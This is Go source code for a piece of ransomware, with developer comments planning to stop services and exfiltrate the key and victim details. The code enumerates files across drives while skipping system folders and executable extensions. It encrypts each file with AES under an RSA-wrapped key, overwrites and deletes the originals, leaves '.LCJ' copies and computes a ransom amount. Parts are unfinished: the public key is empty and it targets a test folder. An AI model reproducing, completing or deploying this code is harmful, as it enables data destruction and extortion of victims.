package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and an e-mail
// and send with the message the encryption key

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"sync"
	"time"
)

var key []byte
var file_count int
var MB150 int = 157286400
var operating_system string
var ext_blacklist = []string{
	"LCJ",
	"dll",
	"exe",
	"iso",
	"img",
	"msi",
	"deb",
	"ini",
	"sys",
	"json",
	"msi",
	"msu",
	"mst",
	"ini",
	"img",
	"xml",
	"old",
	"386",
	"adv",
	"ani",
	"bat",
	"bin",
	"cab",
	"cmd",
	"com",
	"cpl",
	"cur",
	"deskthemepack",
	"diagcab",
	"diagcfg",
	"diagpkg",
	"drv",
	"hlp",
	"icl",
	"icns",
	"ico",
	"ics",
	"idx",
	"ldf",
	"lnk",
	"mod",
	"mpa",
	"msc",
	"msp",
	"msstyles",
	"nls",
	"nomedia",
	"ocx",
	"prf",
	"ps1",
	"rom",
	"rtp",
	"scr",
	"shs",
	"spl",
	"theme",
	"themepack",
	"wpx",
	"lock",
	"key",
	"hta",
	"pdb",

}
var WINDOWS_ff_blacklist = []string{
	"bootmgr",
	//"BOOTNXT",
	"Documents and Settings",
	"DumpStack.log",
	"DumpStack.log.tmp",
	"Program Files",
	"Program Files (x86)",
	"ProgramData",
	"Windows",
	"System Volume Information",
	"lost+found",
	"Autodesk",
}
var LINUX_ff_blacklist = []string{
	"bin",
	"boot",
	".cache",
	"dev",
	"etc",
	"initrd.img",
	"lib",
	"lib32",
	"lib64",
	"libx32",
	"lost+found",
	"media",
	"opt",
	"proc",
	"run",
	"sbin",
	"srv",
	"sys",
	"tmp",
	"usr",
	"var",
	"vmlinuz",
}

var wg sync.WaitGroup
var total_files_opened int64 // edode : MB value

func init() {
	operating_system = detect_os()
}

func detect_os()(string){
	operating_sys := runtime.GOOS
	switch operating_sys {
	case "windows":
		return "windows"
	case "darwin":
		return "mac"
	case "linux":
		return "linux"
	default:
		return "windows"
	}
}

func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}

func overwrite_remove(path string) (error) { // lisandro : do not encrypt file if it's above 950MB
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	// overwriting with random values
	defer f.Close()

	info, err := f.Stat()
	Error(err)
	file_size := info.Size()

	total_files_opened = total_files_opened + file_size

	if total_files_opened >= 943718400{
		wg.Wait()
	}

	buff := make([]byte, file_size)
	if _, err := rand.Read(buff); err != nil {
		return err
	}
	_, err = f.WriteAt(buff, 0)
	if err != nil{
		return err
	}

	total_files_opened = total_files_opened - file_size
	if total_files_opened <= 0 {
		total_files_opened = 0
	}
	return nil
}

// ========= ENCRYPT =========
func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
	var public_key string

	block, _ := pem.Decode([]byte(public_key))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("Key type is not RSA")
}

func encrypt_encryption_key(k []byte) []byte {
	public_key, _  		:= ParseRsaPublicKeyFromPemStr()
	encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		public_key,
		[]byte(k),
		nil)
	if err != nil {
		panic(err)
	}
	return encryptedBytes
}

func rand_str(str_size int) string {
	var alphanum string =
		"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&'()[]{}*+-_!?.,;:"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = alphanum[b%byte(len(alphanum))]
	}
	return string(bytes)
}

func create_encryption_key() []byte {
	new_key := []byte(rand_str(32))
	encrypted_new_key :=  encrypt_encryption_key(new_key)
	err := ioutil.WriteFile("key", encrypted_new_key, 0644)
	if err != nil {
		//fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}
	return new_key
}

func encryption_key() {
	the_key, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		key = create_encryption_key() //If not, create one
	} else {
		key = the_key //If so, set key as the key found in the file
	}
}

func encrypt_file(inputfile string, outputfile string) {
	if inputfile == "/root/y/libcef.so"{
		pass()
	}
	b, err := ioutil.ReadFile(inputfile) //Read the target file
	Error(err)
	ciphertext := encrypt(key, b)
	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
	if err != nil {
		//fmt.Printf("Unable to create encrypted file!\n")
		os.Exit(0)
	}
}

func encodeBase64(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func encrypt(key, text []byte) []byte {
	var above_150MB bool = false
	var not_ciphered_text, ciphered_text, encoded_string []byte

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(text) > MB150 {
		ciphered_text 	  = text[:10485760]
		not_ciphered_text = text[10485760:]
		encoded_string = encodeBase64(ciphered_text)
		above_150MB = true
	} else {
		encoded_string = encodeBase64(text)
	}

	ciphertext := make([]byte, aes.BlockSize+len(encoded_string))

	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], encoded_string)

	if above_150MB {
		return append(ciphertext, not_ciphered_text...);
	}
	return ciphertext;
}
// ========= END ENCRYPT =========

func is_in_blacklist(val interface{}, array interface{}) (bool) {
	exists := false

	switch reflect.TypeOf(array).Kind() {
	case reflect.Slice:
		s := reflect.ValueOf(array)

		for i := 0; i < s.Len(); i++ {
			if reflect.DeepEqual(val, s.Index(i).Interface()) == true {
				//index = i
				exists = true
				return exists//, index
			}
		}
	}
	return exists
}

func list_dir(path string)([]string){ // lisandro : check file extension here
	searchDir := path
	var fileList []string

	if operating_system == "linux" {
		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
			fileList = append(fileList, path)
			return err
		})
		if e != nil {
			panic(e)
		}
	}

	if operating_system == "windows"{
		var disk_drives string              // edode : C:; I:; E:;
		var base_folder_and_childs []string // edode : base_folder_and_childs are folders like "Program Files/*"; "Windows/*"
		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
			cut := strings.Split(path, "\\")
			disk_drives = cut[0]
			base_folder_and_childs = cut[1:]
			base_folder := cut[1]
			for _, ff := range(WINDOWS_ff_blacklist){
				if strings.ToLower(base_folder) == strings.ToLower(ff){
					return filepath.SkipDir
				}
			}
			z := strings.Join(base_folder_and_childs, "\\")
			disk_drives = disk_drives + "\\" + z
			if !is_dir(disk_drives){
				fileList = append(fileList, disk_drives)
			}
			return err
		})

		if e != nil {
			panic(e)
		}
	}
	return fileList
}

func list_root_dir(root string) ([]string) {
	var files []string
	fileInfo, err := ioutil.ReadDir(root)
	if err != nil {
		return files
	}
	for _, file := range fileInfo {
		files = append(files, file.Name())
	}
	return files
}

func get_all_files()([]string){
	var all_files 		 []string
	var root_dirs 		 []string
	var root_dirs_parsed []string

	if operating_system == "linux"{
		root_dirs = list_root_dir("/")
		for _, dirs := range(root_dirs){
			if !is_in_blacklist(dirs, LINUX_ff_blacklist){
				if !is_dir(dirs){
					if !is_symlink("/"+dirs){
						if len(all_files) == 0 {
							all_files = list_dir("/" + dirs)
						} else {
							temp := make([]string, len(all_files))
							copy(temp, all_files)
							all_files = list_dir("/" + dirs)
							for _, file := range(temp){
								all_files = append(all_files, file)
							}
						}
					}
				}
			}
		}
	}

	if operating_system == "windows"{
		connected_drives := get_drives()
		for _, drive := range(connected_drives){
			temp := list_root_dir(drive + ":\\")
			for _, files := range(temp){
				root_dirs = append(root_dirs, drive + ":\\" + files)
			}
		}
		for _, dirs := range(root_dirs){
			if !is_in_blacklist(strings.Split(dirs, "\\")[1], WINDOWS_ff_blacklist){
				root_dirs_parsed = append(root_dirs_parsed, dirs)
			}
		}
		for _, dirs := range(root_dirs_parsed){
			if is_dir(dirs){
				temp := list_dir(dirs)
				for _, files := range(temp){
					all_files = append(all_files, files)
				}
			} else {
				all_files = append(all_files, dirs)
			}
		}
	}
	return all_files;
}

func get_drives() (r []string){
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ"{
		f, err := os.Open(string(drive)+":\\")
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}
	return
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

// lisandro : only works for linux -> add Windows support
func is_symlink(file string)(bool) {
	fi, err := os.Lstat(file)
	if err != nil{
		log.Fatal(err)
	}
	if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
		return true
	} else {
		return false
	}
}


func check_ext(file string) bool{
	ext_split := strings.Split(file, ".")
	file_ext  := ext_split[len(ext_split)-1:][0]
	for _, ext := range ext_blacklist {
		if file_ext == ext{
			return true
		}
	}
	return false
}

func ransom_amount(files_encrypted int) (int) {
	return int(float32(files_encrypted) * 1.25)
}

func pass()(){
	_ = ""
}

func listdir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err	})

	if e != nil {
		panic(e)
	}
	return fileList
}

func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
	start := time.Now()
	files := listdir("/root/y")
	//files := get_all_files()
	encryption_key()

	c := make(chan string, 100)
	var fe int
	for _, f := range(files){
		if check_ext(f) || is_dir(f) || is_symlink(f){
			continue
		}
		if runtime.NumGoroutine() == 50{
			wg.Wait()
		}
		if len(c) > cap(c) - 50 { // lisandro : create func wipe chan
			wg.Wait()
			for {
				if len(c) == 0{ break }
				d := <- c
				e := os.Remove(d)
				if e!=nil { continue }
			}
		}
		fe++
		wg.Add(1)
		go func (f string, c chan string) (){
			defer wg.Done()
			encrypt_file(f, f+".LCJ")
			err := overwrite_remove(f)
			if err != nil{
				pass()
			}
			c <- f
		}(f, c)
	}

	wg.Wait()
	if len(c) != 0{
		for {
			if len(c) == 0{ break }
			d := <- c
			e := os.Remove(d)
			if e!=nil { continue }
		}
	}

	fmt.Println("Files encrypted : ", fe, "Ransom amount : ", ransom_amount(fe))
	log.Printf("SECOND ELAPSED : %s", time.Since(start))
}

/*
edode : getting the memory address of variables :
  var pa *[]string
  pa = &file_tree
  fmt.Println("In for : ", &pa)
*/
